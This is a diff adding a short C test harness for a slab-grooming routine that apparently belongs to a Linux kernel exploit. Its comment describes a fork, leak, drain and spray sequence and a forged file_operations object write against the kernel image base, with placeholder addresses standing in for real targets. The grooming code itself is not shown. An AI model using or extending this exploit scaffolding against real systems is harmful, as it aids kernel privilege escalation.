@@ -1,0 +1,23 @@
+/* Standalone test for groom_and_install_fops_object(), independent of
+ * KASLR (uses fake target addresses, harmless -- validates the
+ * fork/leak/drain/spray choreography and object-write path without
+ * ever depending on the real kernel target being correct). Test harness
+ * only, not part of the ported payload flow. */
+#include <stdio.h>
+#include <stdlib.h>
+
+#include "05_mm_slab_grooming.h"
+#include "target.h"
+
+int main(void) {
+  const char *cpu = getenv("GROOM_CPU");
+  if (cpu && *cpu) groom_set_cpu(atoi(cpu));
+  uint64_t page_base = groom_and_install_fops_object(
+      TARGET_KIMAGE_TEXT_BASE, 0xdeadbeefULL, 0xcafebabeULL);
+  if (!page_base) {
+    fprintf(stderr, "groom failed\n");
+    return 1;
+  }
+  printf("payload_base=%016llx\n", (unsigned long long)page_base);
+  return 0;
+}
